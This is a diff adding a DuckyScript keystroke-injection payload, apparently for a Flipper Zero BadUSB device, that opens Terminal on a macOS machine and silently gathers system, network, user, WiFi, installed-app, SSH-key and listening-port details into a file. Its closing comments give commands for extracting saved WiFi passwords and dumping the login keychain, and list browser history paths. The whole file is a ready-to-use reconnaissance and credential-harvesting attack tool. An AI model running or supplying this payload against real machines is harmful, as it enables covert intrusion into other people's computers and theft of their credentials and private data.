@@ -1,0 +1,36 @@
+REM ============================================================
+REM Title:    macOS System Reconnaissance
+REM Target:   macOS 12+ (Monterey/Ventura/Sonoma)
+REM Author:   FlipperZero-guide
+REM Category: Recon
+REM Privs:    User (no root)
+REM Layout:   US (macOS default)
+REM Time:     ~10 secondi
+REM Detect:   Basso - comandi nativi macOS
+REM Desc:     Raccoglie info sistema, rete, utenti, WiFi,
+REM           applicazioni installate, SSH keys, browser history.
+REM ============================================================
+
+DELAY 2000
+GUI SPACE
+DELAY 700
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1500
+
+STRING mkdir -p /tmp/.recon && echo "=== macOS RECON ===" > /tmp/.recon/out.txt && echo "Date: $(date)" >> /tmp/.recon/out.txt && echo "Hostname: $(hostname)" >> /tmp/.recon/out.txt && echo "User: $(whoami)" >> /tmp/.recon/out.txt && echo "OS: $(sw_vers -productVersion)" >> /tmp/.recon/out.txt && echo "=== NETWORK ===" >> /tmp/.recon/out.txt && ifconfig >> /tmp/.recon/out.txt && echo "=== ARP ===" >> /tmp/.recon/out.txt && arp -a >> /tmp/.recon/out.txt && echo "=== WIFI ===" >> /tmp/.recon/out.txt && /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s >> /tmp/.recon/out.txt 2>/dev/null && echo "=== USERS ===" >> /tmp/.recon/out.txt && dscl . -list /Users | grep -v "^_" >> /tmp/.recon/out.txt && echo "=== INSTALLED APPS ===" >> /tmp/.recon/out.txt && ls /Applications >> /tmp/.recon/out.txt && echo "=== SSH KEYS ===" >> /tmp/.recon/out.txt && ls -la ~/.ssh/ >> /tmp/.recon/out.txt 2>/dev/null && echo "=== LISTENING PORTS ===" >> /tmp/.recon/out.txt && lsof -i -P -n | grep LISTEN >> /tmp/.recon/out.txt && echo "=== SAVED WIFI ===" >> /tmp/.recon/out.txt && networksetup -listpreferredwirelessnetworks en0 >> /tmp/.recon/out.txt 2>/dev/null && cp /tmp/.recon/out.txt ~/Desktop/recon_$(hostname).txt && rm -rf /tmp/.recon
+ENTER
+
+REM ============================================================
+REM Per estrarre password WiFi salvate (richiede password utente):
+REM security find-generic-password -wa "SSID_NAME"
+REM
+REM Per dump completo Keychain (richiede password utente):
+REM security dump-keychain -d login.keychain
+REM
+REM Per history browser:
+REM Chrome: ~/Library/Application Support/Google/Chrome/Default/History
+REM Safari: ~/Library/Safari/History.db
+REM Firefox: ~/Library/Application Support/Firefox/Profiles/*/places.sqlite
+REM ============================================================
